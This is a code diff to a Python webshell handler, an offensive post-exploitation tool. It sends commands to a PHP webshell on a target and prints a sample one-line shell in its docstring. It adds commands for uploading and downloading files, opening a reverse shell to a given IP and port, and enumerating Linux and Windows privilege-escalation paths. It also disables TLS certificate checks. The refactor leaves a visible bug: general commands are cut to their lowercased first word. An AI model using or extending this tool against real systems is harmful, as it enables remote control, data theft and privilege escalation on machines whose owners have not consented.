@@ -18,14 +18,14 @@ Usage:
 
 Example:
     python3 webshell_handler.py http://target/webshell.php cmd
-    
+
 The script assumes the webshell executes system commands passed through the
 specified parameter, e.g.:
     GET http://target/shell.php?cmd=id
-    
+
 Example of webshell.php file:
     <?php system($_GET['cmd']); ?>
-    
+
 Type 'exit' to terminate the session.
 """
 
@@ -33,14 +33,18 @@ import os
 import sys
 import base64
 import atexit
+import urllib3
 import readline
 from requests import Session, Response, RequestException
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
 
 HISTORY_FILE = ".webshell_history"
 
 COMMANDS = [
     "help",
     "exit",
+    "clear",
     "detect",
     "enum",
     "download",
@@ -68,14 +72,14 @@ def completer(text: str, state: int) -> str | None:
 
 def execute_command(session: Session, url: str, param: str, cmd: str) -> str:
     """Execute a command on the remote webshell."""
-    r: Response = session.get(url, params={param: cmd}, timeout=20)
+    r: Response = session.get(url, params={param: cmd}, timeout=20, verify=False)
     return r.text.strip()
 
 
 def detect_os(session: Session, url: str, param: str) -> str:
     """Detect whether the target system is Linux or Windows."""
     print("Detecting OS")
-    
+
     data: str = execute_command(session, url, param, "uname -a")
     if data:
         print("Linux detected")
@@ -119,7 +123,7 @@ def upload(session: Session, url: str, param: str, local: str, remote: str) -> N
             b64 = base64.b64encode(f.read()).decode()
         execute_command(session, url, param, f"echo {b64} | base64 -d > {remote}")
         print(f"Upload finished\nLocal: {local}\nRemote: {remote}")
-        
+
     except Exception as e:
         print(f"Upload failed: {e}")
 
@@ -133,7 +137,7 @@ def reverse_shell(session: Session, url: str, param: str, ip: str, port: str) ->
 
 def priv_enum_linux(session: Session, url: str, param: str) -> None:
     """Run basic Linux privilege escalation enumeration commands."""
-    print("\nLinux PrivEsc Enumeration\n")
+    print("\nLinux PrivEsc Enumeration")
     checks = {
         "User": "whoami",
         "ID": "id",
@@ -151,7 +155,7 @@ def priv_enum_linux(session: Session, url: str, param: str) -> None:
 
 def priv_enum_windows(session: Session, url: str, param: str) -> None:
     """Run basic Windows privilege escalation enumeration commands."""
-    print("\nWindows PrivEsc Enumeration\n")
+    print("\nWindows PrivEsc Enumeration")
     checks = {
         "User": "whoami",
         "System": "systeminfo",
@@ -166,7 +170,7 @@ def priv_enum_windows(session: Session, url: str, param: str) -> None:
 
 def help_menu() -> None:
     """Display available commands."""
-    print("Commands\n\n"
+    print("Commands:\n"
           "help - show help\n"
           "exit - terminate\n"
           "detect - detect OS\n"
@@ -184,7 +188,8 @@ def print_welcome_message(url: str, param: str) -> None:
          f"Parameter: {param}\n"
          "History enabled\n"
          "Tab completion enabled\n"
-         "Type help\n")
+         "Type help to see available commands\n"
+         "Type exit to terminate the session\n")
 
 
 def handle_webshell(session: Session, url: str, param: str) -> None:
@@ -192,23 +197,31 @@ def handle_webshell(session: Session, url: str, param: str) -> None:
     setup_readline()
     print_welcome_message(url, param)
     os_type: str = "unknown"
-    user: str = execute_command(session, url, param, "whoami").strip()
-    host: str = execute_command(session, url, param, "hostname").strip()
-    cwd: str = execute_command(session, url, param, "pwd").strip()
     
     while True:
         try:
-            cmd = input(f"{user}@{host}:{cwd}\nwebshell> ").strip()
+            # Basic prompt only.
+            # user_input: str = input("\nwebshell> ").strip()
 
-            if not cmd:
+            # The prompt shows the current user, host, and working directory.
+            user: str = execute_command(session, url, param, "whoami").strip()
+            host: str = execute_command(session, url, param, "hostname").strip()
+            cwd: str = execute_command(session, url, param, "pwd").strip()
+            user_input: str = input(f"\n{user}@{host}\n{cwd}\nwebshell> ").strip()
+            
+            parts: list[str] = user_input.split()
+            
+            if not parts:
                 continue
+            
+            cmd: str = parts[0].lower()
 
             if cmd == "exit":
                 print("Exiting webshell.")
                 break
 
             if cmd == "help":
-                print(f"Target: {url}\nParameter: {param}\n")
+                print(f"\nWebshell Handler\nTarget host: {url}\nCommand parameter: {param}\n")
                 help_menu()
                 continue
 
@@ -225,13 +238,15 @@ def handle_webshell(session: Session, url: str, param: str) -> None:
                     priv_enum_windows(session, url, param)
                 continue
 
-            if cmd.startswith("download "):
-                remote: str = cmd.split(" ", 1)[1]
+            if cmd == "download":
+                if len(parts) != 2:
+                    print("usage: download <remote>")
+                    continue
+                remote: str = parts[1]
                 download(session, url, param, remote)
                 continue
 
-            if cmd.startswith("upload "):
-                parts = cmd.split()
+            if cmd == "upload":
                 if len(parts) != 3:
                     print("usage: upload <local> <remote>")
                     continue
@@ -240,8 +255,7 @@ def handle_webshell(session: Session, url: str, param: str) -> None:
                 upload(session, url, param, local, remote)
                 continue
 
-            if cmd.startswith("rev "):
-                parts = cmd.split()
+            if cmd == "rev":
                 if len(parts) != 3:
                     print("usage: rev <ip> <port>")
                     continue
@@ -250,8 +264,12 @@ def handle_webshell(session: Session, url: str, param: str) -> None:
                 reverse_shell(session, url, param, ip, port)
                 continue
 
+            if cmd in ["clear", "cls"]:
+                os.system("clear")
+                continue
+
             output: str = execute_command(session, url, param, cmd)
-            print(output)
+            print(f"\n{output}")
 
         except KeyboardInterrupt:
             print("\nKeyboardInterrupt: Session terminated by user.")
